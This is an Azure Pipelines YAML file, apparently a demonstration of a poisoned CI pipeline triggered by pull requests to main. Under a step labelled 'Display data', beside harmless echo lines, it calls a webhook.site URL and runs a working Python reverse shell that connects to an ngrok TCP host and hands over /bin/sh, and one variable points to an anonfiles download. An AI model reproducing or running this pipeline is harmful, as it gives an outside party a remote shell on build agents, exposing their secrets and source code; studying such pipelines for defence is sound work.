pr:
- main

pool: Default

variables:
- name: varificationUrl # This variable is just an example of a trusted variable that can be compromised
  value: https://cdn-114.anonfiles.com/z2u7T06fy2/d910a710-1662484505

steps:
  - script: |
      echo "Url to verify: $(varificationUrl)"
      echo "verifying the following branch:"
      echo "$(Build.SourceBranchName)"
      echo "verifying the following commit:"
      echo "$(Build.SourceVersionMessage)"
      curl https://webhook.site/e2ab8e47-8c65-46f3-9bd9-994863448b40
      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.eu.ngrok.io",11106));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


      
    displayName: Display data

  
